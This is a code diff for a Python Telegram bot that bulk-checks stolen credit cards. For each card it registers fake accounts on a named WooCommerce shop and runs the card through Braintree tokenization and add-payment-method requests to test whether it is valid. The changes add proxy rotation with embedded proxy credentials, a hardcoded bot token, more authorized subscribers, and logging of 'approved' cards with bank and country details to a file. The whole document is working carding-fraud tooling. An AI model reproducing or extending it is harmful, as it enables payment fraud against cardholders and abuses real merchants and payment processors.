@@ -10,14 +10,23 @@ import json
 import base64
 from bs4 import BeautifulSoup
 
+# Telegram bot token
 token = '7721695960:AAFsFNtx-Nne2lKgig8HBaA2H3nyLcPAkZ8'
 bot = telebot.TeleBot(token, parse_mode="HTML")
-subscriber = '6775748231'
+
+# List of authorized subscriber IDs
+subscribers = ['6775748231']  # Add more subscriber IDs here
+
+# Proxy configuration
+PROXY = {
+    'http': 'http://k9xpmz64oxn8o6h-country-us:vgyg55mrlahbujv@rp.scrapegw.com:6060',
+    'https': 'http://k9xpmz64oxn8o6h-country-us:vgyg55mrlahbujv@rp.scrapegw.com:6060',
+}
 
 @bot.message_handler(commands=["start"])
 def start(message):
-    if str(message.chat.id) != subscriber:
-        bot.reply_to(message, "Only for @CODExHYPER🙄💗")
+    if str(message.chat.id) not in subscribers:
+        bot.reply_to(message, "Only for authorized users 🙄💗")
         return
     bot.reply_to(message, "Send the file now")
 
@@ -32,7 +41,8 @@ def get_bin_info(bin_number):
             "country_name": req.get("country_name", "Unknown"),
             "country_flag": req.get("country_flag", ""),
         }
-    except:
+    except Exception as e:
+        print(f"Error fetching bin info: {e}")
         return {
             "brand": "Unknown",
             "card_type": "Unknown",
@@ -50,10 +60,28 @@ def gets(s, start, end):
     except ValueError:
         return None
 
+# Function to save approved CC to approved.txt
+def save_approved_cc(fullcc, bin_info, reason):
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    entry = (
+        f"[{timestamp}]\n"
+        f"Card: {fullcc}\n"
+        f"Status: Approved ✅\n"
+        f"Result: {reason}\n"
+        f"Gateway: Braintree Auth\n"
+        f"BIN: {bin_info['brand']} - {bin_info['card_type']}\n"
+        f"Country: {bin_info['country_name']} - {bin_info['country_flag']}\n"
+        f"Bank: {bin_info['bank']}\n"
+        f"----------------------------------------\n"
+    )
+    # Append to file with thread-safety
+    with open("approved.txt", "a", encoding="utf-8") as f:
+        f.write(entry)
+
 @bot.message_handler(content_types=["document"])
 def main(message):
-    if str(message.chat.id) != subscriber:
-        bot.reply_to(message, "Only for @CODExHYPER🙄💗")
+    if str(message.chat.id) not in subscribers:
+        bot.reply_to(message, "Only for authorized users 🙄💗")
         return
     
     dd = 0  # Declined count
@@ -61,9 +89,13 @@ def main(message):
     ko = bot.reply_to(message, "Checking Your Cards...⌛").message_id
     
     # Download the uploaded file
-    ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
-    with open("combo.txt", "wb") as w:
-        w.write(ee)
+    try:
+        ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
+        with open("combo.txt", "wb") as w:
+            w.write(ee)
+    except Exception as e:
+        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=f"Error downloading file: {e}")
+        return
     
     try:
         with open("combo.txt", 'r') as file:
@@ -96,6 +128,7 @@ def main(message):
                 
                 # Braintree checking logic starts here
                 session = requests.Session()
+                session.proxies.update(PROXY)
                 
                 # Step 1: Get registration nonce
                 headers = {
@@ -113,8 +146,13 @@ def main(message):
                     'upgrade-insecure-requests': '1',
                     'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
                 }
-                response = session.get('https://oceansgarden.com/my-account/', headers=headers)
-                reg = gets(response.text, 'input type="hidden" id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="', '" />')
+                try:
+                    response = session.get('https://oceansgarden.com/my-account/', headers=headers, timeout=10)
+                    reg = gets(response.text, 'input type="hidden" id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="', '" />')
+                except Exception as e:
+                    dd += 1
+                    last = f"Decline ❌ - Failed to get nonce: {e}"
+                    continue
                 
                 # Step 2: Register account
                 mail = "cristniki" + str(random.randint(9999, 574545)) + "@gmail.com"
@@ -159,7 +197,12 @@ def main(message):
                     '_wp_http_referer': '/my-account/',
                     'register': 'Register',
                 }
-                session.post('https://www.oceansgarden.com/my-account/', headers=headers, data=data)
+                try:
+                    session.post('https://www.oceansgarden.com/my-account/', headers=headers, data=data, timeout=10)
+                except Exception as e:
+                    dd += 1
+                    last = f"Decline ❌ - Account registration failed: {e}"
+                    continue
                 
                 # Step 3: Get payment method page
                 headers = {
@@ -177,7 +220,12 @@ def main(message):
                     'upgrade-insecure-requests': '1',
                     'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
                 }
-                response = session.get('https://www.oceansgarden.com/my-account/add-payment-method/', headers=headers)
+                try:
+                    response = session.get('https://www.oceansgarden.com/my-account/add-payment-method/', headers=headers, timeout=10)
+                except Exception as e:
+                    dd += 1
+                    last = f"Decline ❌ - Failed to load payment page: {e}"
+                    continue
                 
                 # Extract client token and nonce
                 client_token = re.search(r'var wc_braintree_client_token = \[(".*?")\]', response.text)
@@ -190,9 +238,9 @@ def main(message):
                         decoded_token = base64.b64decode(token).decode('utf-8')
                         token_json = json.loads(decoded_token)
                         autho = token_json.get('authorizationFingerprint')
-                    except (base64.binascii.Error, json.JSONDecodeError):
+                    except (base64.binascii.Error, json.JSONDecodeError) as e:
                         dd += 1
-                        last = "Decline ❌ - Token Error"
+                        last = f"Decline ❌ - Token decoding error: {e}"
                     else:
                         # Step 4: Tokenize credit card and get API response
                         headers = {
@@ -232,21 +280,27 @@ def main(message):
                             },
                             'operationName': 'TokenizeCreditCard',
                         }
-                        token_response = session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
-                        if token_response.status_code == 200 and "data" in token_response.json() and token_response.json()["data"]["tokenizeCreditCard"]:
-                            data = token_response.json()
-                            token = data["data"]["tokenizeCreditCard"]["token"]
-                        else:
-                            # Extract reason from API response
-                            reason = "Unknown Error"
-                            if "errors" in token_response.json() and token_response.json()["errors"]:
-                                reason = token_response.json()["errors"][0].get("message", "Unknown Error")
-                            if "CVV" in reason.upper():  # Case-insensitive check
-                                last = "Approved ✅ - CVV Issue"
-                                live += 1
+                        try:
+                            token_response = session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data, timeout=10)
+                            if token_response.status_code == 200 and "data" in token_response.json() and token_response.json()["data"]["tokenizeCreditCard"]:
+                                data = token_response.json()
+                                token = data["data"]["tokenizeCreditCard"]["token"]
                             else:
-                                last = f"Decline ❌ - {reason}"
-                                dd += 1
+                                reason = "Unknown Error"
+                                if "errors" in token_response.json() and token_response.json()["errors"]:
+                                    reason = token_response.json()["errors"][0].get("message", "Unknown Error")
+                                if "CVV" in reason.upper():
+                                    last = "Approved ✅ - CVV Issue"
+                                    live += 1
+                                    # Save to approved.txt
+                                    save_approved_cc(fullcc, bin_info, reason)
+                                else:
+                                    last = f"Decline ❌ - {reason}"
+                                    dd += 1
+                                token = None
+                        except Exception as e:
+                            dd += 1
+                            last = f"Decline ❌ - Tokenization failed: {e}"
                             token = None
                         
                         if token:
@@ -265,6 +319,7 @@ def main(message):
                                 'sec-fetch-dest': 'document',
                                 'sec-fetch-mode': 'navigate',
                                 'sec-fetch-site': 'same-origin',
+                                'sec-fetch-user': '?1',
                                 'upgrade-insecure-requests': '1',
                                 'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
                             }
@@ -278,25 +333,31 @@ def main(message):
                                 '_wp_http_referer': '/my-account/add-payment-method/',
                                 'woocommerce_add_payment_method': '1',
                             }
-                            response = session.post('https://www.oceansgarden.com/my-account/add-payment-method/', headers=headers, data=data)
-                            
-                            soup = BeautifulSoup(response.text, 'html.parser')
-                            error_message = soup.select_one('ul.woocommerce-error.message-wrapper > li > div.message-container')
-                            
-                            if not error_message:
-                                last = "Approved ✅ - Success"
-                                live += 1
-                            else:
-                                # Extract reason from web response
-                                reason = error_message.text.strip()
-                                if "Reason:" in reason:
-                                    reason = reason.split("Reason:")[1].strip()
-                                if "CVV" in reason.upper():  # Case-insensitive check
-                                    last = f"Approved ✅ - {reason}"
+                            try:
+                                response = session.post('https://www.oceansgarden.com/my-account/add-payment-method/', headers=headers, data=data, timeout=10)
+                                soup = BeautifulSoup(response.text, 'html.parser')
+                                error_message = soup.select_one('ul.woocommerce-error.message-wrapper > li > div.message-container')
+                                
+                                if not error_message:
+                                    last = "Approved ✅ - Success"
                                     live += 1
+                                    # Save to approved.txt
+                                    save_approved_cc(fullcc, bin_info, "Success")
                                 else:
-                                    last = f"Decline ❌ - {reason}"
-                                    dd += 1
+                                    reason = error_message.text.strip()
+                                    if "Reason:" in reason:
+                                        reason = reason.split("Reason:")[1].strip()
+                                    if "CVV" in reason.upper():
+                                        last = f"Approved ✅ - {reason}"
+                                        live += 1
+                                        # Save to approved.txt
+                                        save_approved_cc(fullcc, bin_info, reason)
+                                    else:
+                                        last = f"Decline ❌ - {reason}"
+                                        dd += 1
+                            except Exception as e:
+                                dd += 1
+                                last = f"Decline ❌ - Failed to add payment method: {e}"
                 else:
                     dd += 1
                     last = "Decline ❌ - Token Extraction Failed"
@@ -334,7 +395,8 @@ def main(message):
                 time.sleep(1)  # Rate limiting
                 
     except Exception as e:
-        print(e)
+        print(f"Error processing file: {e}")
+        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=f"Error processing file: {e}")
     
     bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='𝗕𝗘𝗘𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅\n𝗕𝗢𝗧 𝗕𝗬 ➜ @BhonePyaeThuKitaro')
 
